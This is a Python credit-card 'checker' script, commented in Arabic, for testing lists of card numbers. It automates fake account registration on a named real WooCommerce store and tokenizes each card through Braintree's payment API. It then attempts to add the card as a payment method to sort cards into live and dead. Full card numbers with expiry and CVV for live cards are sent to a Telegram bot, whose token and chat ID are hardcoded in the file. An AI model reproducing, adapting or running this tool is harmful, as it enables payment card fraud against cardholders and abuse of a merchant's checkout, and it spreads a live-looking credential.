import requests
import re
import base64
import random
import string
import time
from bs4 import BeautifulSoup
import os

G = "\033[92m"
R = "\033[91m"
Y = "\033[93m"
C = "\033[96m"
P = "\033[95m"
X = "\033[0m"

# إعدادات التلجرام
token2 = "8344387029:AAGP6f3mvAICX98u_U42ykUfnd8Hx6V9bJM"  # ضع توكن البوت هنا
Id = "7759095500"      # ضع Chat ID هنا

def send_telegram_message(message):
    """إرسال رسالة إلى التلجرام"""
    try:
        url = f"https://api.telegram.org/bot{token2}/sendMessage"
        data = {
            "chat_id": Id,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except:
        return False

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{P}╔══════════════════════════════════════════════════╗
║                   BRAINTREE CHECKER              ║
╚══════════════════════════════════════════════════╝{X}
    """)

def rand_user():
    return 'u' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))

def rand_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=13))
    return f"{name}@gmail.com"

def check_card(cc, mm, yy, cvc):
    if len(mm) == 1: mm = "0" + mm
    if len(yy) == 2: yy = "20" + yy

    print(f"{Y}[*] {cc}|{mm}|{yy}|{cvc} → Checking...{X}")

    s = requests.Session()
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    h = {
        'User-Agent': ua,
        'Accept-Language': 'en-US,en;q=0.9',
    }
    s.headers = h
    
    try:
        r = s.get('https://www.calipercovers.com/my-account/', timeout=30)
            
        nonce = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', r.text)
        if not nonce:
            return f"{cc}|{mm}|{yy}|{cvc} → No nonce"

        reg_data = {
            'username': rand_user(),
            'email': rand_email(),
            'woocommerce-register-nonce': nonce.group(1),
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        }
        
        s.post('https://www.calipercovers.com/my-account/', data=reg_data, timeout=30)

        r = s.get('https://www.calipercovers.com/my-account/add-payment-method/', timeout=30)
            
        if 'wc_braintree_client_token' not in r.text:
            return f"{cc}|{mm}|{yy}|{cvc} → No token"

        client_token = re.search(r'var wc_braintree_client_token\s*=\s*\[\s*"([^"]+)"', r.text).group(1)
        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', r.text).group(1)
        decoded = base64.b64decode(client_token).decode()
        auth_fp = re.search(r'"authorizationFingerprint":"([^"]+)"', decoded).group(1)

        h = {
            'Authorization': f'Bearer {auth_fp}',
            'Braintree-Version': '2018-05-10',
            'Content-Type': 'application/json',
            'Origin': 'https://assets.braintreegateway.com',
        }
        p = {
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvc
                    },
                    "options": {"validate": False}
                }
            }
        }

        resp = requests.post('https://payments.braintree-api.com/graphql', json=p, headers=h, timeout=20)
            
        if 'token' not in resp.text:
            error = resp.json().get('errors', [{}])[0].get('message', 'Token failed')
            return f"{cc}|{mm}|{yy}|{cvc} → {error}"

        token = resp.json()['data']['tokenizeCreditCard']['token']

        d = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"correlation_id":"x"}',
            'woocommerce-add-payment-method-nonce': add_nonce,
            'woocommerce_add_payment_method': '1'
        }
        
        final = s.post('https://www.calipercovers.com/my-account/add-payment-method/', data=d, timeout=30)
            
        text = final.text

        if 'Payment method successfully added' in text:
            result = f"{G}{cc}|{mm}|{yy}|{cvc} → LIVE | APPROVED{X}"
            ida = (f'''Approved ✅\n
ϟ Card -» {cc}|{mm}|{yy}|{cvc}
ϟ Gateway -» Braintree Auth3
ϟ Response -» Payment method successfully added.
ϟ Status -»  Approved! ♻️
ϟ Result -» Charged 0.01$
''') 
            requests.get("https://api.telegram.org/bot"+str(token2)+"/sendMessage?chat_id="+str(Id)+"&text="+str(ida))
        else:
            soup = BeautifulSoup(text, 'html.parser')
            err = soup.find('ul', class_='woocommerce-error')
            if err:
                msg = err.get_text(strip=True)
                reason = re.search(r'Reason:\s*(.+)', msg)
                if reason:
                    result = f"{R}{cc}|{mm}|{yy}|{cvc} → DEAD → {reason.group(1)}{X}"
                else:
                    result = f"{R}{cc}|{mm}|{yy}|{cvc} → DEAD → {msg[:70]}{X}"
            else:
                result = f"{R}{cc}|{mm}|{yy}|{cvc} → DEAD → Unknown Error{X}"

        return result

    except Exception as e:
        return f"{cc}|{mm}|{yy}|{cvc} → Error: {str(e)}"


if __name__ == "__main__":
    banner()
    
    # التحقق من إعدادات التلجرام
    if token2 == "YOUR_BOT_TOKEN" or Id == "YOUR_CHAT_ID":
        print(f"{R}[!] Please set BOT_TOKEN and CHAT_ID in the script{X}")
        exit()
    
    print(f"{C}[+] Running without proxy{X}")
    print(f"{C}[+] Telegram notifications: ENABLED{X}")
    
    file = "pp.txt"
    if not os.path.exists(file):
        print(f"{R}File {file} not found!{X}")
    else:
        with open(file, 'r', encoding='utf-8') as f:
            cards = [line.strip() for line in f if line.strip() and '|' in line]

        print(f"\n{G}[+] {len(cards)} cards loaded from {file}. Starting...\n{X}")
        
        # إرسال بدء الفحص إلى التلجرام
        start_msg = f"🔍 <b>CHECKING STARTED</b>\n\n📁 File: {file}\n💳 Cards: {len(cards)}"
        send_telegram_message(start_msg)
        
        time.sleep(2)

        live_count = 0
        dead_count = 0
        error_count = 0

        for card in cards:
            try:
                cc, mm, yy, cvc = card.split('|')
                result = check_card(cc.strip(), mm.strip(), yy.strip(), cvc.strip())
                print(result)
                
                # عد النتائج
                if "LIVE" in result:
                    live_count += 1
                elif "DEAD" in result:
                    dead_count += 1
                else:
                    error_count += 1
                    
                time.sleep(4)
            except:
                print(f"{R}{card} → Wrong format{X}")
                error_count += 1

        # إرسال ملخص النتائج إلى التلجرام
        summary_msg = f"""
📊 <b>CHECKING COMPLETED</b>

✅ LIVE: {live_count}
❌ DEAD: {dead_count}
⚠️ ERROR: {error_count}
📋 TOTAL: {len(cards)}

🔚 <b>Process Finished</b>
        """
        send_telegram_message(summary_msg)
        
        print(f"\n{G}[+] Checking completed!{X}")
        print(f"{G}[+] Results sent to Telegram{X}")
        print(f"{C}[+] Live: {live_count} | Dead: {dead_count} | Error: {error_count}{X}")

    input(f"\n{P}Press ENTER to exit...{X}")